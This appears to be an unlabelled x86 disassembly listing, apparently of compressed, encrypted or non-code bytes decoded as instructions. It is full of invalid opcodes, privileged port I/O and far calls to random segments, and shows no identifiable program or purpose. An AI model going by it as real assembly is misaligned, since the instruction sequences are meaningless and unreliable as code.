  402ff3:	pop    ss
  402ff4:	(bad)  
  402ff5:	loopne 0x40301d
  402ff7:	ss retf 0x5015
  402ffb:	inc    edi
  402ffc:	mov    esp,DWORD PTR [ecx+ecx*2+0x4b]
  403000:	gs popf 
  403002:	xchg   ebp,eax
  403003:	sub    BYTE PTR [ecx],bh
  403005:	dec    DWORD PTR [eax-0x1cf34526]
  40300b:	aas    
  40300c:	mov    edi,0xb1225a3f
  403011:	xchg   esi,eax
  403012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403013:	in     eax,0x5d
  403015:	mov    bh,0xce
  403017:	xchg   esp,edi
  403019:	(bad)  
  40301a:	fcomi  st,st(4)
  40301c:	mov    ebp,0xcd4bd36f
  403021:	ss dec edx
  403023:	into   
  403024:	pop    edx
  403025:	pop    esp
  403026:	xchg   BYTE PTR [ebp-0x38],bl
  403029:	inc    edx
  40302a:	repz ficomp DWORD PTR [eax]
  40302d:	xor    eax,ebx
  40302f:	pop    ebp
  403030:	dec    eax
  403031:	or     DWORD PTR [edx],esi
  403033:	add    esi,DWORD PTR [edx+0x23888c72]
  403039:	xor    DWORD PTR [ecx],ebp
  40303b:	and    edx,esp
  40303d:	mov    dh,0xfa
  40303f:	mov    al,ds:0x687f3bd4
  403044:	outs   dx,BYTE PTR ds:[esi]
  403045:	push   edx
  403046:	fsub   st(6),st
  403048:	inc    ebp
  403049:	sti    
  40304a:	stc    
  40304b:	xchg   esi,eax
  40304c:	(bad)  
  40304d:	lods   eax,DWORD PTR ds:[esi]
  40304e:	loop   0x403000
  403050:	dec    esp
  403051:	mov    ch,0x3e
  403053:	or     dl,BYTE PTR [ebp-0x1a]
  403056:	jo     0x4030c2
  403058:	push   cs
  403059:	xchg   esp,eax
  40305a:	leave  
  40305b:	ds mov al,0xdd
  40305e:	loopne 0x403066
  403060:	les    esi,FWORD PTR [eax+0x24]
  403063:	xor    BYTE PTR [edx-0x1cb4b6b7],bl
  403069:	xchg   ebp,eax
  40306a:	and    al,0xe
  40306c:	adc    al,0x57
  40306e:	add    dl,bl
  403070:	mov    ds:0x709a30c5,eax
  403075:	push   0xd0bafaed
  40307a:	ret    0xbdc3
  40307d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40307e:	sub    edi,esp
  403080:	pushf  
  403081:	jnp    0x4030c3
  403083:	ret    
  403084:	(bad)
  403087:	outs   dx,BYTE PTR ds:[esi]
  403088:	imul   BYTE PTR [edx+0x30]
  40308b:	and    al,0x5b
  40308d:	cwde   
  40308e:	icebp  
  40308f:	mov    DWORD PTR fs:[eax],esp
  403092:	aam    0x88
  403094:	arpl   ax,dx
  403096:	push   ebx
  403097:	xor    eax,DWORD PTR [ebx+ecx*8+0x66bad770]
  40309e:	cdq    
  40309f:	adc    al,0xb6
  4030a1:	ds inc esp
  4030a3:	mov    eax,0xc1eac14e
  4030a8:	rol    BYTE PTR [esi],1
  4030aa:	xchg   edi,eax
  4030ab:	pop    DWORD PTR [eax]
  4030ad:	in     eax,dx
  4030ae:	ror    BYTE PTR [ecx-0x38fb73c6],cl
  4030b4:	push   ecx
  4030b5:	or     DWORD PTR [esi+0x5b],esp
  4030b8:	test   al,0x4d
  4030ba:	jo     0x403128
  4030bc:	push   esi
  4030bd:	div    BYTE PTR [di]
  4030c0:	dec    ecx
  4030c1:	cmp    eax,0xe8384114
  4030c6:	in     eax,0x43
  4030c8:	rep lods eax,DWORD PTR ds:[esi]
  4030ca:	ret    
  4030cb:	std    
  4030cc:	inc    esi
  4030cd:	int3   
  4030ce:	mov    DWORD PTR [edx-0x7671a32d],ebp
  4030d4:	sbb    eax,0xe421e10d
  4030d9:	add    ch,bl
  4030db:	in     eax,dx
  4030dc:	in     eax,0x35
  4030de:	nop
  4030df:	scas   eax,DWORD PTR es:[edi]
  4030e0:	mov    ds:0x61e6b5c7,eax
  4030e5:	out    dx,al
  4030e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030e7:	aam    0xb7
  4030e9:	call   0x3d41:0xcc6e8770
  4030f0:	push   esi
  4030f1:	sahf   
  4030f2:	cmp    DWORD PTR [ebp+eax*2+0x44424e78],edi
  4030f9:	push   0x78
  4030fb:	add    DWORD PTR [ecx],ecx
  4030fd:	shr    DWORD PTR fs:[esi-0x634b6788],0xd1
  403105:	scas   al,BYTE PTR es:[edi]
  403106:	test   ebp,edx
  403108:	ss push ebx
  40310a:	aas    
  40310b:	popf   
  40310c:	xchg   eax,edx
  40310e:	jo     0x4030b0
  403110:	sbb    dh,BYTE PTR [ebx+0x21]
  403113:	jbe    0x403149
  403115:	cld    
  403116:	mov    bl,0x5d
  403118:	sar    ebx,cl
  40311a:	pop    ebx
  40311b:	adc    BYTE PTR [esi+0x27],0xad
  40311f:	(bad)  
  403120:	enter  0x6079,0x67
  403124:	js     0x40313b
  403126:	lods   al,BYTE PTR ds:[esi]
  403127:	push   esp
  403128:	mov    dh,0xe9
  40312a:	sub    ch,ch
  40312c:	(bad)  
  40312d:	int    0x82
  40312f:	fstp   QWORD PTR [edx-0x2ffa580e]
  403135:	out    dx,eax
  403136:	push   0x33
  403138:	in     eax,dx
  403139:	scas   eax,DWORD PTR es:[edi]
  40313a:	sub    cl,BYTE PTR [eax+0x0]
  40313d:	and    DWORD PTR [esi-0x48661c44],0x21018907
  403147:	add    esp,esi
  403149:	cmp    ch,dl
  40314b:	test   eax,0xa29dca68
  403150:	cs sbb al,0xad
  403153:	sar    DWORD PTR [ecx-0x59ab5e72],cl
  403159:	or     al,0xcc
  40315b:	ja     0x40311a
  40315d:	(bad)  
  40315f:	mov    bl,0x33
  403161:	(bad)  
  403163:	loope  0x403113
  403165:	jmp    0x40318a
  403167:	inc    eax
  403168:	add    DWORD PTR [edi+0x489a3b3e],0x45
  40316f:	das    
  403170:	inc    esp
  403171:	arpl   WORD PTR [edi-0x62da8b9d],bp
  403177:	dec    ebp
  403178:	and    ah,bh
  40317a:	adc    BYTE PTR [ecx+eiz*8+0x66bfc4d7],ch
  403181:	ins    BYTE PTR es:[edi],dx
  403182:	repz loopne 0x403143
  403185:	dec    esp
  403186:	ins    BYTE PTR es:[edi],dx
  403187:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  403189:	ret    0x9a49
  40318c:	out    dx,al
  40318d:	in     al,0x95
  40318f:	es push es
  403191:	mov    dh,0xd0
  403193:	in     eax,0x56
  403195:	jo     0x4031de
  403197:	pop    esp
  403198:	(bad)  
  403199:	fnstcw WORD PTR [edi]
  40319b:	imul   edi,DWORD PTR [ebx+0x7c],0xacb0a663
  4031a2:	repz ja 0x40319e
  4031a5:	sbb    DWORD PTR [ebp-0x13b85eb1],edx
  4031ab:	adc    al,0x18
  4031ad:	int    0xc3
  4031af:	and    ebx,DWORD PTR [edx]
  4031b1:	popf   
  4031b2:	cmp    ch,BYTE PTR [esi-0x41]
  4031b5:	mov    al,ds:0x3654f7bb
  4031ba:	jmp    0x403167
  4031bc:	push   ecx
  4031bd:	mov    ebp,0x4e6aa6aa
  4031c2:	je     0x4031da
  4031c4:	pop    eax
  4031c5:	test   al,0xf5
  4031c7:	popf   
  4031c8:	xchg   edx,eax
  4031c9:	les    esi,FWORD PTR [edi]
  4031cb:	call   0xa7b2:0x60274392
  4031d2:	test   DWORD PTR [ebp+ebp*2+0x378d28c],ecx
  4031d9:	mov    ebx,0xa7434f43
  4031de:	add    bh,BYTE PTR [edi+0x339ff1d0]
  4031e4:	pop    edx
  4031e5:	add    esi,esp
  4031e7:	(bad)  
  4031e8:	sub    bh,BYTE PTR [edx+0x7a]
  4031eb:	xor    al,0x3c
  4031ed:	fwait
  4031ee:	out    dx,al
  4031ef:	in     eax,0x97
  4031f1:	fistp  WORD PTR [esp+eax*8]
  4031f4:	mov    bl,0x7e
  4031f6:	cmp    edx,DWORD PTR [ebp+0x54]
  4031f9:	mov    cl,0x22
  4031fb:	pop    ebp
  4031fc:	loope  0x4031f5
  4031fe:	jns    0x403213
  403200:	mov    BYTE PTR [edi-0x57c4b46d],bh
  403206:	jmp    0xf5ae:0x5a9fa46a
  40320d:	jmp    0x40326c
  40320f:	sbb    al,0xea
  403211:	push   eax
  403212:	nop
  403213:	add    BYTE PTR [esp+edx*4-0x69],0x14
  403218:	sahf   
  403219:	xchg   ecx,eax
  40321a:	xchg   ebp,eax
  40321b:	push   edx
  40321c:	gs ins DWORD PTR es:[edi],dx
  40321e:	das    
  40321f:	sub    DWORD PTR [ecx-0x282e1be0],edi
  403225:	push   0x1502f880
  40322a:	pop    es
  40322b:	mov    ds:0x6fb50314,al
  403230:	bound  edi,QWORD PTR [ebp+0x221f9a40]
  403236:	std    
  403237:	bound  edx,QWORD PTR [edi+0xfe567fb]
  40323d:	clc    
  40323e:	test   DWORD PTR [ecx-0x71eeb4d],edi
  403244:	jp     0x4031f6
  403246:	(bad)  
  403247:	out    0x81,al
  403249:	mov    ah,0x68
  40324b:	out    0xde,al
  40324d:	fmulp  st(2),st
  40324f:	mov    eax,ds:0x2ef6c9bb
  403254:	add    DWORD PTR [ebx],esp
  403256:	pop    esp
  403257:	test   DWORD PTR [eax-0x10fff42f],esp
  40325d:	div    BYTE PTR [eax+0x72]
  403260:	and    al,0x99
  403263:	pop    es
  403264:	push   esi
  403265:	lock enter 0x610c,0x17
  40326a:	aad    0xa
  40326c:	inc    esi
  40326d:	idiv   DWORD PTR [ebx-0x55c2a75e]
  403273:	xor    eax,0xfba78808
  403278:	les    esi,FWORD PTR [edx+0x63]
  40327b:	(bad)  
  40327c:	cmc    
  40327d:	inc    esp
  40327e:	ror    edx,cl
  403280:	ss in  al,0xf
  403283:	sti    
  403284:	call   0x70ee:0x4707e2c
  40328b:	ret    0xacc9
  40328e:	test   al,ah
  403290:	pop    eax
  403291:	in     al,0xfd
  403293:	fwait
  403294:	xor    DWORD PTR [edi-0x7c9295c],ebp
  40329a:	push   0x7819f38a
  40329f:	out    0xc3,eax
  4032a1:	adc    BYTE PTR [ecx-0x545bf702],0xce
  4032a8:	out    0x40,al
  4032aa:	ds push cs
  4032ac:	cmovp  ebx,DWORD PTR [ecx]
  4032af:	out    0xd4,al
  4032b1:	popa   
  4032b2:	cld    
  4032b3:	pusha  
  4032b4:	in     eax,dx
  4032b5:	jmp    0x4032a1
  4032b7:	addr16 jg 0x4032b3
  4032ba:	fstp   QWORD PTR [edx+0x45]
  4032bd:	mov    edi,0x23b224cb
  4032c2:	in     eax,0xe
  4032c4:	jle    0x403332
  4032c6:	xchg   ebx,eax
  4032c7:	ret    0xa551
  4032ca:	test   al,0x9e
  4032cc:	fs adc al,0x22
  4032cf:	pushf  
  4032d0:	jns    0x40325a
  4032d2:	mov    dh,BYTE PTR [edx-0x52579111]
  4032d8:	outs   dx,BYTE PTR ds:[si]
  4032da:	mov    dl,0x62
  4032dc:	or     al,0xf9
  4032de:	test   eax,0x183aa348
  4032e3:	int    0xef
  4032e5:	ins    BYTE PTR es:[edi],dx
  4032e6:	add    DWORD PTR [edx],esp
  4032e8:	in     eax,0x23
  4032ea:	stc    
  4032eb:	test   al,0x36
  4032ed:	and    eax,0x8f9dba1c
  4032f2:	mov    edx,0xfc3a50cb
  4032f7:	stos   DWORD PTR es:[edi],eax
  4032f8:	adc    al,0x2d
  4032fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032fb:	inc    ebx
  4032fc:	sub    eax,0x665c4e75
  403301:	or     bh,bl
  403303:	lds    ebx,FWORD PTR cs:0x6e769358
  40330a:	cmp    bl,dl
  40330c:	xchg   BYTE PTR [esi+eiz*1],ch
  40330f:	pop    ss
  403310:	xchg   ecx,eax
  403311:	data16 mov bl,0x39
  403314:	popf   
  403315:	inc    ebp
  403316:	mov    BYTE PTR [edi],ah
  403318:	out    0x47,al
  40331a:	mov    esi,0x1432d651
  40331f:	fidiv  WORD PTR [edi+ebx*8]
  403322:	lds    esp,FWORD PTR [edx+edx*2-0x4d]
  403326:	fist   WORD PTR [ebx]
  403328:	jl     0x4032bb
  40332a:	inc    ebx
  40332b:	and    ecx,DWORD PTR [ecx]
  40332d:	scas   eax,DWORD PTR es:[edi]
  40332e:	outs   dx,BYTE PTR ds:[esi]
  40332f:	scas   eax,DWORD PTR es:[edi]
  403330:	out    dx,eax
  403331:	loopne 0x40331e
  403333:	unpcklps xmm5,XMMWORD PTR [ebx]
  403336:	jo     0x403386
  403338:	test   DWORD PTR [edi-0x20531060],esi
  40333e:	mov    ah,0xd6
  403340:	xor    ebx,DWORD PTR [esi-0x5e]
  403343:	std    
  403344:	dec    DWORD PTR [edx+edx*8+0x1fa3f12d]
  40334b:	pop    esp
  40334c:	es cmp eax,0x4e9790f0
  403352:	jmp    DWORD PTR [edx-0x6a881978]
  403358:	mov    ch,0xa6
  40335a:	mov    cl,BYTE PTR [ebx+0x6a5aecb4]
  403360:	pop    ss
  403361:	add    DWORD PTR [ebp+ecx*8+0x16],ebx
  403365:	stc    
  403366:	mov    esi,0x60c4b23f
  40336b:	adc    DWORD PTR gs:[edx-0x70aa7e0b],edx
  403372:	sbb    al,0x55
  403374:	out    dx,al
  403375:	push   edx
  403376:	mov    eax,ds:0x10dcc771
  40337b:	ret    
  40337c:	push   ss
  40337d:	and    ebp,DWORD PTR [edx+0x7b]
  403380:	xor    DWORD PTR [esi+ebp*4],0x6b6fa5b7
  403387:	cmp    ebp,DWORD PTR [ebx-0x5150a2c3]
  40338d:	add    bl,cl
  40338f:	fiadd  WORD PTR [ebp-0x1b]
  403392:	outs   dx,BYTE PTR ds:[esi]
  403393:	xchg   edi,eax
  403394:	dec    ecx
  403395:	inc    edi
  403396:	push   ebx
  403397:	es call 0x66b60294
  40339d:	cmp    DWORD PTR [ebp-0x6d],0xa02738b4
  4033a4:	mov    ebx,0x8a86b09a
  4033a9:	dec    esi
  4033aa:	push   edx
  4033ab:	hlt    
  4033ac:	jmp    0x5f04:0x15dfc2e2
  4033b3:	cmp    eax,0x7d158250
  4033b8:	cmp    al,0xd7
  4033ba:	arpl   ax,dx
  4033bc:	fcmovb st,st(6)
  4033be:	xchg   ecx,eax
  4033bf:	or     cl,BYTE PTR [ebp-0x5c]
  4033c2:	ret    
  4033c3:	out    dx,al
  4033c4:	pusha  
  4033c5:	arpl   di,bp
  4033c7:	or     DWORD PTR [edi],0x7c
  4033ca:	xchg   ebp,eax
  4033cb:	mov    ecx,0xb5eb9cea
  4033d0:	fnstenv ds:0x1819428f
  4033d6:	fmul   st,st(6)
  4033d8:	push   ebx
  4033d9:	sub    DWORD PTR [esi+0x780b22fa],ebx
  4033df:	dec    edx
  4033e0:	push   edi
  4033e1:	jp     0x403439
  4033e3:	mov    ds:0xed66bbc5,al
  4033e8:	aam    0x3b
  4033ea:	(bad)  
  4033ec:	cmp    eax,DWORD PTR [eax]
  4033ee:	xor    BYTE PTR [ebp-0xc967057],dl
  4033f4:	push   esi
  4033f5:	sbb    eax,0xc8b99dc8
  4033fa:	and    dh,BYTE PTR [ecx]
  4033fc:	push   0xbd11d195
  403401:	into   
  403402:	pop    esi
  403403:	mov    dl,0x77
  403405:	shr    dl,1
  403407:	fldenv [edi-0x1e]
  40340a:	xchg   ebp,eax
  40340b:	inc    esi
  40340c:	scas   eax,DWORD PTR es:[edi]
  40340d:	or     BYTE PTR ds:0xb11a62da,cl
  403413:	mov    esp,0x1fe8dc18
  403418:	shl    edx,cl
  40341a:	test   eax,0xd753799a
  40341f:	jle    0x4033ef
  403421:	or     edi,edx
  403423:	lods   al,BYTE PTR ds:[esi]
  403424:	std    
  403425:	inc    ecx
  403426:	std    
  403427:	jo     0x40343c
  403429:	jle    0x403409
  40342b:	or     al,0x2f
  40342d:	jge    0x40347a
  40342f:	mov    dh,0xe9
  403431:	pop    ebp
  403432:	es mov edx,0xaf7b231d
  403438:	cli    
  403439:	sbb    BYTE PTR [eax+ebp*1],bl
  40343c:	jnp    0x40342d
  40343e:	jmp    0x9cd56a23
  403443:	aad    0x31
  403445:	pop    edx
  403446:	js     0x40345d
  403448:	(bad)  
  403449:	fwait
  40344a:	jp     0x4033e4
  40344c:	mov    dh,0x98
  40344e:	out    0xd8,eax
  403450:	fstp   QWORD PTR [esi+0x7a]
  403453:	iret   
  403454:	sbb    DWORD PTR [esi],0xffffffa3
  403457:	push   edx
  403458:	imul   esi,DWORD PTR [ecx-0x5d],0xffffffd9
  40345c:	retf   
  40345d:	je     0x403441
  40345f:	add    ebx,DWORD PTR [esp+0x2a5fd162]
  403466:	or     dh,al
  403468:	outs   dx,DWORD PTR ds:[esi]
  403469:	or     ebp,DWORD PTR [eax]
  40346b:	sti    
  40346c:	leave  
  40346d:	mov    ebp,0xf69a9146
  403472:	pop    eax
  403473:	sbb    al,0x3f
  403476:	or     ecx,DWORD PTR [edi]
  403478:	dec    edi
  403479:	cmp    al,0xdb
  40347b:	(bad)  
  40347c:	cdq    
  40347d:	mov    ?,WORD PTR [edx-0x5031005]
  403483:	outs   dx,DWORD PTR ds:[esi]
  403484:	iret   
  403485:	mov    ecx,0x820afd67
  40348a:	and    esi,edi
  40348c:	aam    0xae
  40348e:	and    DWORD PTR [ecx],0xffffffdd
  403491:	push   edx
  403492:	retf   
  403493:	cdq    
  403494:	xchg   esi,eax
  403495:	fdiv   DWORD PTR [esi+0x3eb37d60]
  40349b:	mov    dh,0x99
  40349d:	xchg   esp,eax
  40349e:	ins    BYTE PTR es:[edi],dx
  40349f:	cmp    BYTE PTR [edx+0x546896ad],cl
  4034a5:	cmp    eax,0x1e1d09ab
  4034aa:	inc    ebx
  4034ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ac:	mov    WORD PTR [ebx+0x54c438f8],gs
  4034b2:	sbb    eax,0x71aaba18
  4034b7:	popf   
  4034b8:	mov    dl,0xb9
  4034ba:	ja     0x4034ea
  4034bc:	into   
  4034bd:	adc    ebp,DWORD PTR [esi-0x7e]
  4034c0:	pushf  
  4034c1:	call   0x6cac49a9
  4034c6:	xor    al,0x2
  4034c8:	or     al,0x3
  4034ca:	mov    ds:0x6ce694cf,eax
  4034cf:	out    0x6,eax
  4034d1:	addr16 inc eax
  4034d3:	add    esi,edx
  4034d5:	pop    edx
  4034d6:	into   
  4034d7:	fdivr  DWORD PTR [edx]
  4034d9:	sar    DWORD PTR [edx-0x45e1f9e6],cl
  4034df:	mov    ecx,0xa556f5f1
  4034e4:	push   edi
  4034e5:	adc    al,0x58
  4034e7:	fisub  WORD PTR [ecx+0x153733d3]
  4034ed:	pusha  
  4034ee:	out    dx,eax
  4034ef:	jae    0x4034a2
  4034f1:	lar    ecx,WORD PTR cs:[ebx]
  4034f5:	mov    ds:0xe11f2623,al
  4034fa:	pop    ebp
  4034fb:	ret    0x7d48
  4034fe:	int3   
  4034ff:	imul   BYTE PTR [ebx-0x77f0bb92]
  403505:	pop    ss
  403506:	shl    edx,1
  403508:	(bad)  
  403509:	pop    edi
  40350a:	inc    ebx
  40350b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40350c:	and    eax,0x960b2e7a
  403511:	mov    ah,0x1
  403513:	sub    al,BYTE PTR [edx+0x76]
  403516:	mov    cl,0x8c
  403518:	and    BYTE PTR [eax-0x2e781a4c],al
  40351e:	pop    edi
  40351f:	cmp    eax,0x28201a1
  403524:	cmp    esi,DWORD PTR [edi+ecx*4]
  403527:	mov    bh,0x92
  403529:	lods   eax,DWORD PTR ds:[esi]
  40352a:	lods   eax,DWORD PTR ds:[esi]
  40352b:	sub    eax,DWORD PTR [ecx]
  40352d:	mov    ebx,0xc78c03b1
  403532:	shl    dh,cl
  403534:	pop    ebp
  403535:	adc    BYTE PTR [edx-0x31],bh
  403538:	cld    
  403539:	aam    0xef
  40353b:	std    
  40353c:	xchg   esp,eax
  40353d:	call   0xad60:0xa8e18da8
  403544:	xor    eax,0x5c66d772
  403549:	(bad)  
  40354a:	into   
  40354b:	add    eax,0xef0c47b3
  403550:	fistp  QWORD PTR ds:0x94eef657
  403556:	loopne 0x403576
  403558:	jecxz  0x403535
  40355a:	adc    al,0xa3
  40355c:	or     al,0xae
  40355e:	int3   
  40355f:	jp     0x403537
  403561:	push   edi
  403562:	cdq    
  403563:	jecxz  0x4035b4
  403565:	pop    edi
  403566:	pop    eax
  403567:	mov    edi,0x285534d
  40356c:	add    DWORD PTR [esi],0xad472f97
  403572:	outs   dx,BYTE PTR ds:[esi]
  403573:	into   
  403574:	inc    esp
  403575:	mov    bl,0x6f
  403577:	push   esp
  403578:	jb     0x4034fc
  40357a:	push   edi
  40357b:	cmp    al,0xe7
  40357d:	cmp    BYTE PTR [edx-0x5a],0x9d
  403581:	mov    ebp,0x7716862a
  403586:	les    esp,FWORD PTR [ebx+0x7b]
  403589:	enter  0xdfaf,0x56
  40358d:	ds sbb al,0xb1
  403590:	hlt    
  403591:	jl     0x4035d7
  403593:	pop    ebp
  403594:	ins    DWORD PTR es:[edi],dx
  403595:	xchg   ebp,eax
  403596:	push   0x140a1fba
  40359b:	das    
  40359c:	pop    ebx
  40359d:	fdivr  QWORD PTR [ebp-0x44c7734d]
  4035a3:	xor    eax,0x45abf0ca
  4035a8:	pop    esi
  4035a9:	sbb    al,0x4d
  4035ab:	xchg   esi,eax
  4035ac:	cdq    
  4035ad:	pop    esp
  4035ae:	xor    ah,al
  4035b0:	xchg   esi,eax
  4035b1:	xchg   esp,eax
  4035b2:	or     bh,BYTE PTR [esi+esi*8]
  4035b5:	test   al,0xac
  4035b7:	cmp    al,0xd2
  4035b9:	push   0x7167e56e
  4035be:	jns    0x403594
  4035c0:	push   esi
  4035c1:	mov    al,ds:0xa9e5cbc8
  4035c6:	xchg   BYTE PTR [eax-0x591bbaa6],ah
  4035cc:	jne    0x4035bc
  4035ce:	push   es
  4035cf:	xchg   BYTE PTR [edi+0x26abfdac],al
  4035d5:	jl     0x4035fb
  4035d7:	test   eax,0x76f5f178
  4035dc:	mov    al,0x5d
  4035de:	cmp    bl,ah
  4035e0:	push   0x2c9b53ac
  4035e5:	cld    
  4035e6:	pop    ds
  4035e7:	xor    DWORD PTR [esi+ebx*2+0x510d24e5],esi
  4035ee:	push   esi
  4035ef:	std    
  4035f0:	sti    
  4035f1:	dec    ebp
  4035f2:	fs lahf 
  4035f4:	lock sbb eax,0x1b4d7f96
  4035fa:	into   
  4035fb:	sbb    eax,0x98b70b61
  403600:	pop    edi
  403601:	sar    BYTE PTR ds:[esi],cl
  403604:	out    0x7d,eax
  403606:	cmc    
  403607:	mov    BYTE PTR [edx-0x79],al
  40360a:	cwde   
  40360b:	gs es call 0x804867d7
  403612:	pusha  
  403613:	cs mov ebx,0xb7766bdc
  403619:	xor    al,0xd9
  40361b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40361c:	add    cl,BYTE PTR ds:0x6b8b66a7
  403622:	cs cmovnp ecx,DWORD PTR es:[edi]
  403627:	inc    esp
  403628:	mul    ebp
  40362a:	cmp    BYTE PTR [ebx+0x6dfbbb5d],ch
  403630:	loope  0x4035e0
  403632:	push   edi
  403633:	and    BYTE PTR [eax-0x2d],dl
  403636:	and    esi,DWORD PTR [ecx*8-0x5ba98d32]
  40363d:	adc    esi,DWORD PTR [edi+0x42807098]
  403643:	es push esp
  403645:	(bad)  
  403646:	mul    dh
  403648:	push   es
  403649:	aas    
  40364a:	push   edi
  40364b:	sub    BYTE PTR [ebp-0x1f],al
  40364e:	fistp  WORD PTR [esi+ebp*8-0x6f]
  403652:	mov    ah,0xb5
  403654:	pusha  
  403655:	das    
  403656:	loop   0x403663
  403658:	imul   esi,DWORD PTR [edi-0x2c],0x5
  40365c:	retf   0xcbbf
  40365f:	push   eax
  403660:	aam    0xb2
  403662:	rcl    ebp,0xd7
  403665:	loopne 0x40363d
  403667:	push   ebx
  403668:	js     0x403607
  40366a:	push   ss
  40366b:	pop    edi
  40366c:	xchg   ecx,eax
  40366d:	push   0xfba6c4f3
  403672:	cs mov ecx,0xb5e14f64
  403678:	xchg   esi,eax
  403679:	enter  0x3bca,0x2f
  40367d:	push   ebx
  40367e:	or     edx,ebp
  403680:	adc    ebx,0xca992abe
  403686:	lods   al,BYTE PTR ds:[esi]
  403687:	push   eax
  403688:	mov    bh,0x40
  40368a:	xchg   edi,eax
  40368b:	repz int 0xb0
  40368e:	lea    edi,[ecx]
  403690:	cmc    
  403691:	pop    esi
  403692:	in     al,0x20
  403694:	iret   
  403695:	and    eax,0xb95c12cf
  40369a:	cmp    bh,0xf0
  40369d:	out    0x64,eax
  40369f:	popf   
  4036a0:	(bad)  [edi]
  4036a2:	mov    BYTE PTR [ecx+0x3],ah
  4036a5:	popf   
  4036a6:	jno    0x403652
  4036a8:	sub    bl,al
  4036aa:	jmp    0x4036ec
  4036ac:	daa    
  4036ad:	int    0x65
  4036af:	mov    al,BYTE PTR [edi-0x2d]
  4036b2:	sub    DWORD PTR [edi],eax
  4036b4:	adc    bl,BYTE PTR [edx+0x2b]
  4036b7:	push   ss
  4036b8:	pop    ds
  4036b9:	scas   al,BYTE PTR es:[edi]
  4036ba:	adc    dh,BYTE PTR [eax+0x27]
  4036bd:	sub    al,0xc9
  4036bf:	adc    al,0x71
  4036c1:	cmp    eax,0x68f05d52
  4036c6:	pop    esi
  4036c7:	push   ebx
  4036c8:	push   0xffffffbc
  4036ca:	mov    ebx,0x352383e0
  4036cf:	fcomp  QWORD PTR [ebx+0x6d]
  4036d2:	mov    esi,0x40eb588c
  4036d7:	imul   edx,DWORD PTR [edi+0x5a9c772e],0x26a188b2
  4036e1:	mov    eax,0xde333037
  4036e6:	pop    edx
  4036e7:	inc    esi
  4036e8:	sub    DWORD PTR [ecx],esi
  4036ea:	div    BYTE PTR [ebx+0x11d78202]
  4036f0:	in     eax,0x2a
  4036f2:	test   DWORD PTR [edi-0x1c810456],edx
  4036f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036f9:	xor    al,0x6e
  4036fb:	cs jge 0x4036fc
  4036fe:	in     al,0x6b
  403700:	mov    DWORD PTR [edi],edx
  403702:	push   ss
  403703:	retf   
  403704:	mov    bl,0x94
  403706:	xor    DWORD PTR [ecx+0x13be5c11],0xffffff81
  40370d:	push   eax
  40370e:	sbb    al,0x34
  403710:	imul   edx,DWORD PTR [ecx+0x64],0xfc965dd9
  403717:	push   ss
  403718:	ret    
  403719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40371a:	add    DWORD PTR [esi+eax*8-0x3f505fad],ebp
  403721:	dec    edx
  403722:	push   0x80aeaf08
  403727:	leave  
  403728:	jg     0x40377f
  40372a:	inc    esp
  40372b:	outs   dx,DWORD PTR ds:[esi]
  40372c:	imul   ebp,DWORD PTR [ebx+0x463a1d42],0x2924f264
  403736:	das    
  403737:	inc    ecx
  403738:	pop    edi
  403739:	inc    ebx
  40373a:	fnsave [ebp-0x1f]
  40373d:	inc    ecx
  40373e:	mov    DWORD PTR [esi],edx
  403740:	fidiv  WORD PTR [edi+0x23d0afbe]
  403746:	adc    ah,BYTE PTR [ebp-0x54]
  403749:	xchg   DWORD PTR [esi+0x71],esi
  40374c:	jb     0x4037c2
  40374e:	adc    al,0xc1
  403750:	mov    WORD PTR [eax+ebp*8+0x152157bc],cs
  403757:	adc    eax,0x774db26c
  40375c:	(bad)  
  40375d:	pop    esi
  40375e:	mov    cl,0x0
  403760:	adc    bh,BYTE PTR [esi-0x5fa9c460]
  403766:	icebp  
  403767:	mov    eax,0xdf9c90a4
  40376c:	int    0xb7
  40376e:	imul   esp,esi,0xbd30d377
  403774:	or     BYTE PTR [ecx],cl
  403776:	lds    ecx,FWORD PTR [esi+0x78]
  403779:	xchg   ecx,eax
  40377a:	shl    DWORD PTR [esi],1
  40377c:	jbe    0x403754
  40377e:	sti    
  40377f:	push   edi
  403780:	jecxz  0x403703
  403782:	hlt    
  403783:	pop    esp
  403784:	inc    ebx
  403785:	mov    eax,0x2407181
  40378a:	sub    eax,0x6a4ca95e
  40378f:	shl    DWORD PTR [edi],1
  403791:	push   cs
  403792:	cmp    al,0xfc
  403794:	cmc    
  403795:	inc    edx
  403796:	mov    edx,0xd2dac117
  40379b:	adc    ebx,DWORD PTR [eax-0x32]
  40379e:	aaa    
  40379f:	sbb    esp,ecx
  4037a1:	jg     0x403814
  4037a3:	mov    BYTE PTR [eax+ecx*1-0x1cba252e],dh
  4037aa:	cld    
  4037ab:	add    BYTE PTR [esi-0x24253cc2],dl
  4037b1:	les    edx,FWORD PTR [ecx]
  4037b3:	outs   dx,DWORD PTR ds:[esi]
  4037b4:	dec    ebp
  4037b5:	das    
  4037b6:	pswapd mm7,mm7
  4037ba:	fnsave [edx-0x4a]
  4037bd:	sub    ebp,DWORD PTR [ebx+eax*2]
  4037c0:	leave  
  4037c1:	adc    bh,dh
  4037c3:	mov    dl,0xd8
  4037c5:	fwait
  4037c6:	pop    ds
  4037c7:	mov    al,ds:0x42096ceb
  4037cc:	sbb    DWORD PTR [edx-0x2d],edx
  4037cf:	add    eax,0xc91be24d
  4037d4:	push   eax
  4037d5:	popa   
  4037d6:	mov    ebp,0x415ba069
  4037db:	pop    ebp
  4037dc:	mov    ds:0x96da0af2,al
  4037e1:	push   ds
  4037e2:	(bad)  
  4037e3:	cli    
  4037e4:	jl     0x4037f0
  4037e6:	shl    DWORD PTR [ecx+eiz*8-0x10],cl
  4037ea:	jecxz  0x40377f
  4037ec:	xchg   ebx,eax
  4037ed:	retf   
  4037ee:	repz call 0xd818:0x114ace75
  4037f6:	repnz and DWORD PTR [edi+ecx*8-0x40],0x6e0f8946
  4037ff:	fdivr  QWORD PTR [edi]
  403801:	pop    ss
  403802:	pop    ds
  403803:	add    al,0x64
  403805:	ret    0xbdab
  403808:	cli    
